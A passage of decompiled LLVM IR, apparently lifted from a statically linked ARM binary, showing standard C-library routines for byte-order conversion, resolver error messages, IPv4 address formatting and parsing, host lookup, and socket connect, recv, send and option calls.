  %v1_25064 = trunc i32 %v0_25064 to i8
  %v2_25064 = load i32, i32* @r4, align 4
  %v3_25064 = add i32 %v2_25064, 16
  %v4_25064 = inttoptr i32 %v3_25064 to i8*
  store i8 %v1_25064, i8* %v4_25064, align 1
  %v0_25068 = load i32, i32* @r4, align 4
  %v1_25068 = add i32 %v0_25068, 17
  store i32 %v1_25068, i32* %r0.global-to-local, align 4
  %v4_2506c = call i32 @__GI_mempcpy(i32 %v1_25068, i32 %v2_25058, i32 19, i32 %v3_25048)
  store i32 %v4_2506c, i32* %r0.global-to-local, align 4
  %v0_25070 = load i32, i32* @r5, align 4
  store i32 %v0_25070, i32* %r1.global-to-local, align 4
  %v3_25078 = inttoptr i32 %v4_2506c to i8*
  %v4_25078 = call i32 @__GI_memset(i8* %v3_25078, i32 %v0_25070, i32 13)
  store i32 %v4_25078, i32* %r0.global-to-local, align 4
  %v0_2507c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2507c

dec_label_pc_2507c:                               ; preds = %entry, %dec_label_pc_25038
  %v0_2507c = phi i32 [ %v3_2502c, %entry ], [ %v0_2507c.pre, %dec_label_pc_25038 ]
  store i32 %v0_2507c, i32* %r0.global-to-local, align 4
  store i32 %v3_25014, i32* @r4, align 4
  store i32 %v6_25014, i32* @r5, align 4
  store i32 %v9_25014, i32* @r6, align 4
  ret i32 %v0_2507c

; uselistorder directives
  uselistorder i32 %v0_2507c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder label %dec_label_pc_2507c, { 1, 0 }
}

define i32 @__GI_htons(i32 %arg1) local_unnamed_addr {
entry:
  %v3_25090 = udiv i32 %arg1, 256
  %v1_25094 = mul i32 %arg1, 256
  %v4_25098 = and i32 %v1_25094, 65280
  %v5_25098 = or i32 %v4_25098, %v3_25090
  ret i32 %v5_25098
}

define i32 @__GI_htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_250b8 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_250b8
}

define i32 @__GI_ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_250c0 = udiv i32 %arg1, 256
  %v1_250c4 = mul i32 %arg1, 256
  %v4_250c8 = and i32 %v1_250c4, 65280
  %v5_250c8 = or i32 %v4_250c8, %v3_250c0
  ret i32 %v5_250c8
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_250e8 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_250e8
}

define i32 @hstrerror(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, 5
  br i1 %tmp, label %dec_label_pc_25110, label %dec_label_pc_25104

dec_label_pc_25104:                               ; preds = %entry
  ret i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -34356)

dec_label_pc_25110:                               ; preds = %entry
  %v4_25118 = mul i32 %arg1, 4
  %v5_25118 = add i32 %v4_25118, add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -20)
  %v6_25118 = inttoptr i32 %v5_25118 to i32*
  %v7_25118 = load i32, i32* %v6_25118, align 4
  ret i32 %v7_25118

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_herror(i8* %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v3_25134 = icmp eq i8* %arg1, null
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r2.global-to-local, align 4
  br i1 %v3_25134, label %dec_label_pc_25158, label %dec_label_pc_25144

dec_label_pc_25144:                               ; preds = %entry
  %v2_25144 = load i8, i8* %arg1, align 1
  %v2_25148 = icmp eq i8 %v2_25144, 0
  br i1 %v2_25148, label %dec_label_pc_25158, label %dec_label_pc_25164

dec_label_pc_25158:                               ; preds = %dec_label_pc_25144, %entry
  br label %dec_label_pc_25164

dec_label_pc_25164:                               ; preds = %dec_label_pc_25144, %dec_label_pc_25158
  %storemerge = phi i32 [ add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -34338), %dec_label_pc_25158 ], [ add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -34340), %dec_label_pc_25144 ]
  store i32 %storemerge, i32* @r5, align 4
  %v0_25168 = call i32 @__aeabi_read_tp()
  %v3_2516c = load i32, i32* @global_var_428f0.3141, align 4
  %v2_25170 = add i32 %v3_2516c, %v0_25168
  %v3_25170 = inttoptr i32 %v2_25170 to i32*
  %v4_25170 = load i32, i32* %v3_25170, align 4
  %v2_25174 = icmp ugt i32 %v4_25170, 3
  %v7_25174 = icmp eq i32 %v4_25170, 4
  %v2_25178 = xor i1 %v7_25174, true
  %v3_25178 = and i1 %v2_25174, %v2_25178
  br i1 %v3_25178, label %bb, label %.thread9

bb:                                               ; preds = %dec_label_pc_25164
  %v4_2517c = load i32, i32* %r2.global-to-local, align 4
  %v6_2517c = add i32 %v4_2517c, -34356
  store i32 %v6_2517c, i32* @ip, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_25164, %bb
  %v2_25180 = xor i1 %v2_25174, true
  %v3_25180 = or i1 %v7_25174, %v2_25180
  br i1 %v3_25180, label %bb22, label %._crit_edge

._crit_edge:                                      ; preds = %.thread9
  %v0_251a8.pre = load i32, i32* @ip, align 4
  %v0_25194.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb23

bb22:                                             ; preds = %.thread9
  %v4_25184 = load i32, i32* %r2.global-to-local, align 4
  %v6_25184 = add i32 %v4_25184, -20
  %v8_25188 = mul i32 %v4_25170, 4
  %v9_25188 = add i32 %v6_25184, %v8_25188
  %v10_25188 = inttoptr i32 %v9_25188 to i32*
  %v11_25188 = load i32, i32* %v10_25188, align 4
  store i32 %v11_25188, i32* @ip, align 4
  br label %bb23

bb23:                                             ; preds = %._crit_edge, %bb22
  %v0_25194 = phi i32 [ %v0_25194.pre, %._crit_edge ], [ %v4_25184, %bb22 ]
  %v0_251a8 = phi i32 [ %v0_251a8.pre, %._crit_edge ], [ %v11_25188, %bb22 ]
  %v2_25194 = add i32 %v0_25194, 152
  %v3_25194 = inttoptr i32 %v2_25194 to i32*
  %v4_25194 = load i32, i32* %v3_25194, align 4
  %v2_25198 = add i32 %v0_25194, -34472
  %v1_2519c = inttoptr i32 %v4_25194 to i32*
  %v2_2519c = load i32, i32* %v1_2519c, align 4
  store i32 %v2_2519c, i32* @r0, align 4
  %v0_251a0 = load i32, i32* @r4, align 4
  store i32 %v0_251a0, i32* %r2.global-to-local, align 4
  %v0_251a4 = load i32, i32* @r5, align 4
  %v6_251ac = call i32 @fprintf(i32 %v2_2519c, i32 %v2_25198, i32 %v0_251a0, i32 %v0_251a4, i32 %v0_251a8)
  ret i32 %v6_251ac

; uselistorder directives
  uselistorder i32 %v0_25194, { 1, 0 }
  uselistorder i1 %v7_25174, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 152, { 1, 0, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_25164, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %v3_251d8 = load i32, i32* @r4, align 4
  %v6_251d8 = load i32, i32* @r5, align 4
  %v9_251d8 = load i32, i32* @r6, align 4
  %v12_251d8 = load i32, i32* @r7, align 4
  %v15_251d8 = load i32, i32* @r8, align 4
  %v18_251d8 = load i32, i32* @sb, align 4
  %v21_251d8 = load i32, i32* @sl, align 4
  %v24_251d8 = load i32, i32* @fp, align 4
  %v0_251dc = load i32, i32* @r0, align 4
  %v5_251f8 = call i32 @llvm.bswap.i32(i32 %v0_251dc)
  %v0_251fc = load i32, i32* @r1, align 4
  %v1_251fc = add i32 %v0_251fc, 15
  store i32 %v1_251fc, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 255, i32* @r7, align 4
  store i32 46, i32* @sl, align 4
  br label %dec_label_pc_25238

dec_label_pc_2521c:                               ; preds = %dec_label_pc_25238
  %v1_25224 = inttoptr i32 %v0_25254 to i8*
  %v2_25224 = call i32 @_uintmaxtostr(i8* %v1_25224)
  %v0_25228 = load i32, i32* @r6, align 4
  %v2_25228 = icmp eq i32 %v0_25228, 0
  %v1_2522c = add i32 %v2_25224, -1
  store i32 %v1_2522c, i32* %r1.global-to-local, align 4
  br i1 %v2_25228, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_2521c
  %v1_25230 = load i32, i32* @sl, align 4
  %v2_25230 = trunc i32 %v1_25230 to i8
  %v4_25230 = inttoptr i32 %v0_25228 to i8*
  store i8 %v2_25230, i8* %v4_25230, align 1
  %v0_25234.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_2521c, %bb
  %v0_25234 = phi i32 [ %v1_2522c, %dec_label_pc_2521c ], [ %v0_25234.pre, %bb ]
  store i32 %v0_25234, i32* @r6, align 4
  %v0_25238.pre = load i32, i32* @r5, align 4
  %v0_2523c.pre = load i32, i32* @r7, align 4
  %v1_2523c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_25238

dec_label_pc_25238:                               ; preds = %entry, %bb17
  %v0_25254 = phi i32 [ %v1_251fc, %entry ], [ %v0_25234, %bb17 ]
  %v1_2523c = phi i32 [ %v5_251f8, %entry ], [ %v1_2523c.pre, %bb17 ]
  %v0_2523c = phi i32 [ 255, %entry ], [ %v0_2523c.pre, %bb17 ]
  %v0_2524c = phi i32 [ 0, %entry ], [ %v0_25238.pre, %bb17 ]
  %v7_25238 = icmp eq i32 %v0_2524c, 3
  store i1 %v7_25238, i1* @cpsr_z, align 1
  %v2_2523c = and i32 %v0_2523c, %v1_2523c
  store i32 %v2_2523c, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v3_25248 = udiv i32 %v1_2523c, 256
  store i32 %v3_25248, i32* @r4, align 4
  %v1_2524c = add i32 %v0_2524c, 1
  store i32 %v1_2524c, i32* @r5, align 4
  %v7_25250 = icmp sgt i32 %v0_2524c, 3
  br i1 %v7_25250, label %dec_label_pc_25254, label %dec_label_pc_2521c

dec_label_pc_25254:                               ; preds = %dec_label_pc_25238
  %v1_25254 = add i32 %v0_25254, 1
  store i32 %v3_251d8, i32* @r4, align 4
  store i32 %v6_251d8, i32* @r5, align 4
  store i32 %v9_251d8, i32* @r6, align 4
  store i32 %v12_251d8, i32* @r7, align 4
  store i32 %v15_251d8, i32* @r8, align 4
  store i32 %v18_251d8, i32* @sb, align 4
  store i32 %v21_251d8, i32* @sl, align 4
  store i32 %v24_251d8, i32* @fp, align 4
  ret i32 %v1_25254

; uselistorder directives
  uselistorder i32 %v0_2524c, { 2, 0, 1 }
  uselistorder i32 %v0_25234, { 1, 0 }
  uselistorder i32 (i8*)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_25238, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 25568), i32* @r1, align 4
  %v0_25274 = call i32 @__GI_inet_ntoa_r()
  %v0_25278 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_25278, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v3_2527c = udiv i32 %v0_25274, 128
  %v4_2527c = mul i32 %v0_25274, 33554432
  %v5_2527c = or i32 %v3_2527c, %v4_2527c
  %v8_2527c = and i32 %v5_2527c, %v0_25274
  store i32 %v8_2527c, i32* @r6, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  ret i32 %v0_25274

; uselistorder directives
  uselistorder i32 %v0_25274, { 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_25288 = ptrtoint i32* %stack_var_-12 to i32
  %v0_2528c = load i32, i32* @r0, align 4
  %v2_2528c = inttoptr i32 %v0_2528c to i8*
  %v3_2528c = call i32 @inet_aton(i8* %v2_2528c, i32 %v2_25288)
  %v2_25290 = icmp eq i32 %v3_2528c, 0
  %v4_25294 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_25290, i32 -1, i32 %v4_25294
  ret i32 %storemerge
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  store i32 2, i32* @r1, align 4
  %v0_252b4 = call i32 @__GI_gethostbyname2()
  ret i32 %v0_252b4
}

define i32 @__GI_gethostbyname2() local_unnamed_addr {
entry:
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v3_252c4 = load i32, i32* @r4, align 4
  %v0_252e0 = load i32, i32* @r0, align 4
  %v3_252e4 = load i32, i32* @global_var_428f0.3141, align 4
  %v0_252e8 = call i32 @__aeabi_read_tp()
  %v2_252f0 = add i32 %v3_252e4, %v0_252e8
  store i32 %v2_252f0, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 25584), i32* @r3, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 26024), i32* @r2, align 4
  %v1_25310 = call i32 @gethostbyname2_r(i32 %v0_252e0)
  store i32 %v3_252c4, i32* @r4, align 4
  ret i32 %tmp4
}

define i32 @function_2532c(i32* %arg1) local_unnamed_addr {
dec_label_pc_2532c:
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_2532c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2532c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_2532c
  %v1_2532c = load i32, i32* @r6, align 4
  store i32 %v1_2532c, i32* %arg1, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_2532c, %bb
  %v7_25330 = phi i32 [ %tmp, %dec_label_pc_2532c ], [ 0, %bb ]
  ret i32 %v7_25330

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_25334 = load i32, i32* @r7, align 4
  store i32 %v3_25334, i32* %stack_var_-8, align 4
  %v0_25340 = load i32, i32* @r0, align 4
  store i32 %v0_25340, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_25340, -4095
  br i1 %tmp, label %dec_label_pc_25368, label %dec_label_pc_25350

dec_label_pc_25350:                               ; preds = %entry
  %v0_25354 = call i32 @__aeabi_read_tp()
  %v3_25358 = load i16, i16* @global_var_42934.3040, align 2
  %v4_25358 = sext i16 %v3_25358 to i32
  %v0_2535c = load i32, i32* %r2.global-to-local, align 4
  %v1_2535c = sub i32 0, %v0_2535c
  store i32 %v1_2535c, i32* %r2.global-to-local, align 4
  %v3_25360 = add i32 %v4_25358, %v0_25354
  %v4_25360 = inttoptr i32 %v3_25360 to i32*
  store i32 %v1_2535c, i32* %v4_25360, align 4
  %v2_25368.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_25368

dec_label_pc_25368:                               ; preds = %entry, %dec_label_pc_25350
  %v1_2536c = phi i32 [ %v0_25340, %entry ], [ -1, %dec_label_pc_25350 ]
  %v2_25368 = phi i32 [ %v3_25334, %entry ], [ %v2_25368.pre, %dec_label_pc_25350 ]
  store i32 %v2_25368, i32* @r7, align 4
  ret i32 %v1_2536c

; uselistorder directives
  uselistorder i32 %v0_25340, { 1, 0, 2 }
  uselistorder label %dec_label_pc_25368, { 1, 0 }
}

define i32 @"$d.10"(i32 %arg1, i64* %arg2) local_unnamed_addr {
dec_label_pc_25370:
  %v0_25370 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_25370, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_25370
  %tmp = ptrtoint i64* %arg2 to i32
  %v2_25370 = load i32, i32* @fp, align 4
  %v9_25370 = shl i32 %v2_25370, %tmp
  %v10_25370 = and i32 %v9_25370, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_25370, %bb
  %v12_25374 = phi i32 [ %arg1, %dec_label_pc_25370 ], [ %v10_25370, %bb ]
  ret i32 %v12_25374

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_2537c = load i32, i32* @r4, align 4
  store i32 %v3_2537c, i32* %stack_var_-20, align 4
  %v6_2537c = load i32, i32* @r5, align 4
  %v9_2537c = load i32, i32* @r6, align 4
  %v12_2537c = load i32, i32* @r7, align 4
  %v4_25388 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 29852) to i32*), align 4
  %v2_2538c = icmp eq i32 %v4_25388, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_2538c, label %dec_label_pc_253a4, label %entry.dec_label_pc_253b0_crit_edge

entry.dec_label_pc_253b0_crit_edge:               ; preds = %entry
  br label %dec_label_pc_253b0

dec_label_pc_253a4:                               ; preds = %entry
  store i32 %v3_2537c, i32* @r4, align 4
  store i32 %v9_2537c, i32* @r6, align 4
  store i32 %v12_2537c, i32* @r7, align 4
  %v0_253ac = call i32 @__sys_connect()
  br label %dec_label_pc_253b0

dec_label_pc_253b0:                               ; preds = %entry.dec_label_pc_253b0_crit_edge, %dec_label_pc_253a4
  %v0_253b0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_253b0, i32* @r5, align 4
  %v0_253c0 = load i32, i32* @r4, align 4
  store i32 %v0_253c0, i32* @r0, align 4
  %v0_253c4 = call i32 @__sys_connect()
  store i32 %v0_253c4, i32* @r4, align 4
  %v0_253cc = load i32, i32* @r5, align 4
  %v1_253d0 = call i32 @__libc_disable_asynccancel(i32 %v0_253cc)
  %v0_253d4 = load i32, i32* @r4, align 4
  %v2_253dc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_253dc, i32* @r4, align 4
  store i32 %v6_2537c, i32* @r5, align 4
  store i32 %v9_2537c, i32* @r6, align 4
  store i32 %v12_2537c, i32* @r7, align 4
  ret i32 %v0_253d4

; uselistorder directives
  uselistorder label %dec_label_pc_253b0, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_253ec = load i32, i32* @r7, align 4
  store i32 %v3_253ec, i32* %stack_var_-8, align 4
  %v0_253f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_253f8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_253f8, -4095
  br i1 %tmp, label %dec_label_pc_25420, label %dec_label_pc_25408

dec_label_pc_25408:                               ; preds = %entry
  %v0_2540c = call i32 @__aeabi_read_tp()
  %v3_25410 = load i16, i16* @global_var_42934.3040, align 2
  %v4_25410 = sext i16 %v3_25410 to i32
  %v0_25414 = load i32, i32* %r2.global-to-local, align 4
  %v1_25414 = sub i32 0, %v0_25414
  store i32 %v1_25414, i32* %r2.global-to-local, align 4
  %v3_25418 = add i32 %v4_25410, %v0_2540c
  %v4_25418 = inttoptr i32 %v3_25418 to i32*
  store i32 %v1_25414, i32* %v4_25418, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_25420.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_25420

dec_label_pc_25420:                               ; preds = %entry, %dec_label_pc_25408
  %v1_25424 = phi i32 [ %v0_253f8, %entry ], [ -1, %dec_label_pc_25408 ]
  %v2_25420 = phi i32 [ %v3_253ec, %entry ], [ %v2_25420.pre, %dec_label_pc_25408 ]
  store i32 %v2_25420, i32* @r7, align 4
  ret i32 %v1_25424

; uselistorder directives
  uselistorder i32 %v0_253f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_25420, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_25428:
  %v0_25428 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_25428, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_25428
  %v2_25428 = load i32, i32* @lr, align 4
  %v8_25428 = shl i32 %v2_25428, %arg2
  %v9_25428 = and i32 %v8_25428, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_25428, %bb
  %v10_2542c = phi i32 [ %arg1, %dec_label_pc_25428 ], [ %v9_25428, %bb ]
  ret i32 %v10_2542c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_25430 = load i32, i32* @r4, align 4
  store i32 %v3_25430, i32* %stack_var_-12, align 4
  %v0_25440 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_25440, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_25440, -4095
  br i1 %tmp, label %dec_label_pc_25468, label %dec_label_pc_25450

dec_label_pc_25450:                               ; preds = %entry
  %v0_25454 = call i32 @__aeabi_read_tp()
  %v3_25458 = load i16, i16* @global_var_42934.3040, align 2
  %v4_25458 = sext i16 %v3_25458 to i32
  %v0_2545c = load i32, i32* %r2.global-to-local, align 4
  %v1_2545c = sub i32 0, %v0_2545c
  store i32 %v1_2545c, i32* %r2.global-to-local, align 4
  %v3_25460 = add i32 %v4_25458, %v0_25454
  %v4_25460 = inttoptr i32 %v3_25460 to i32*
  store i32 %v1_2545c, i32* %v4_25460, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_25468.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_25468

dec_label_pc_25468:                               ; preds = %entry, %dec_label_pc_25450
  %v1_2546c = phi i32 [ %v0_25440, %entry ], [ -1, %dec_label_pc_25450 ]
  %v2_25468 = phi i32 [ %v3_25430, %entry ], [ %v2_25468.pre, %dec_label_pc_25450 ]
  store i32 %v2_25468, i32* @r4, align 4
  ret i32 %v1_2546c

; uselistorder directives
  uselistorder i32 %v0_25440, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_25468, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i64* %arg2) local_unnamed_addr {
dec_label_pc_25470:
  %v0_25470 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_25470, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_25470
  %v2_25470 = load i32, i32* @r7, align 4
  %v5_25470 = udiv i32 %v2_25470, 4
  %v6_25470 = and i32 %v5_25470, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_25470, %bb
  %v12_25474 = phi i32 [ %arg1, %dec_label_pc_25470 ], [ %v6_25470, %bb ]
  ret i32 %v12_25474

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_25478 = load i32, i32* @r7, align 4
  store i32 %v3_25478, i32* %stack_var_-8, align 4
  %v0_25484 = load i32, i32* @r0, align 4
  store i32 %v0_25484, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_25484, -4095
  br i1 %tmp, label %dec_label_pc_254ac, label %dec_label_pc_25494

dec_label_pc_25494:                               ; preds = %entry
  %v0_25498 = call i32 @__aeabi_read_tp()
  %v3_2549c = load i16, i16* @global_var_42934.3040, align 2
  %v4_2549c = sext i16 %v3_2549c to i32
  %v0_254a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_254a0 = sub i32 0, %v0_254a0
  store i32 %v1_254a0, i32* %r2.global-to-local, align 4
  %v3_254a4 = add i32 %v4_2549c, %v0_25498
  %v4_254a4 = inttoptr i32 %v3_254a4 to i32*
  store i32 %v1_254a0, i32* %v4_254a4, align 4
  %v2_254ac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_254ac

dec_label_pc_254ac:                               ; preds = %entry, %dec_label_pc_25494
  %v1_254b0 = phi i32 [ %v0_25484, %entry ], [ -1, %dec_label_pc_25494 ]
  %v2_254ac = phi i32 [ %v3_25478, %entry ], [ %v2_254ac.pre, %dec_label_pc_25494 ]
  store i32 %v2_254ac, i32* @r7, align 4
  ret i32 %v1_254b0

; uselistorder directives
  uselistorder i32 %v0_25484, { 1, 0, 2 }
  uselistorder label %dec_label_pc_254ac, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_254b4:
  %v0_254b4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_254b4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_254b4
  %v5_254b4 = udiv i32 %arg2, 4
  %v6_254b4 = and i32 %v5_254b4, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_254b4, %bb
  %v4_254b8 = phi i32 [ %arg1, %dec_label_pc_254b4 ], [ %v6_254b4, %bb ]
  ret i32 %v4_254b8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_254c0 = load i32, i32* @r4, align 4
  store i32 %v3_254c0, i32* %stack_var_-24, align 4
  %v6_254c0 = load i32, i32* @r5, align 4
  %v9_254c0 = load i32, i32* @r6, align 4
  %v12_254c0 = load i32, i32* @r7, align 4
  %v15_254c0 = load i32, i32* @r8, align 4
  %v18_254c0 = load i32, i32* @lr, align 4
  %v4_254cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 29852) to i32*), align 4
  %v2_254d0 = icmp eq i32 %v4_254cc, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_254d0, label %dec_label_pc_254e8, label %entry.dec_label_pc_254f0_crit_edge

entry.dec_label_pc_254f0_crit_edge:               ; preds = %entry
  br label %dec_label_pc_254f0

dec_label_pc_254e8:                               ; preds = %entry
  store i32 %v3_254c0, i32* @r4, align 4
  store i32 %v9_254c0, i32* @r6, align 4
  store i32 %v12_254c0, i32* @r7, align 4
  store i32 %v15_254c0, i32* @r8, align 4
  %v0_254ec = call i32 @__sys_recv()
  br label %dec_label_pc_254f0

dec_label_pc_254f0:                               ; preds = %entry.dec_label_pc_254f0_crit_edge, %dec_label_pc_254e8
  %v0_254f0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_254f0, i32* @r5, align 4
  %v0_25504 = load i32, i32* @r4, align 4
  store i32 %v0_25504, i32* @r0, align 4
  %v0_25508 = call i32 @__sys_recv()
  store i32 %v0_25508, i32* @r4, align 4
  %v0_25510 = load i32, i32* @r5, align 4
  %v1_25514 = call i32 @__libc_disable_asynccancel(i32 %v0_25510)
  %v0_25518 = load i32, i32* @r4, align 4
  %v2_2551c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_2551c, i32* @r4, align 4
  store i32 %v6_254c0, i32* @r5, align 4
  store i32 %v9_254c0, i32* @r6, align 4
  store i32 %v12_254c0, i32* @r7, align 4
  store i32 %v15_254c0, i32* @r8, align 4
  store i32 %v18_254c0, i32* @lr, align 4
  ret i32 %v0_25518

; uselistorder directives
  uselistorder label %dec_label_pc_254f0, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2552c = load i32, i32* @r7, align 4
  store i32 %v3_2552c, i32* %stack_var_-8, align 4
  %v0_25538 = load i32, i32* @r0, align 4
  store i32 %v0_25538, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_25538, -4095
  br i1 %tmp, label %dec_label_pc_25560, label %dec_label_pc_25548

dec_label_pc_25548:                               ; preds = %entry
  %v0_2554c = call i32 @__aeabi_read_tp()
  %v3_25550 = load i16, i16* @global_var_42934.3040, align 2
  %v4_25550 = sext i16 %v3_25550 to i32
  %v0_25554 = load i32, i32* %r2.global-to-local, align 4
  %v1_25554 = sub i32 0, %v0_25554
  store i32 %v1_25554, i32* %r2.global-to-local, align 4
  %v3_25558 = add i32 %v4_25550, %v0_2554c
  %v4_25558 = inttoptr i32 %v3_25558 to i32*
  store i32 %v1_25554, i32* %v4_25558, align 4
  %v2_25560.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_25560

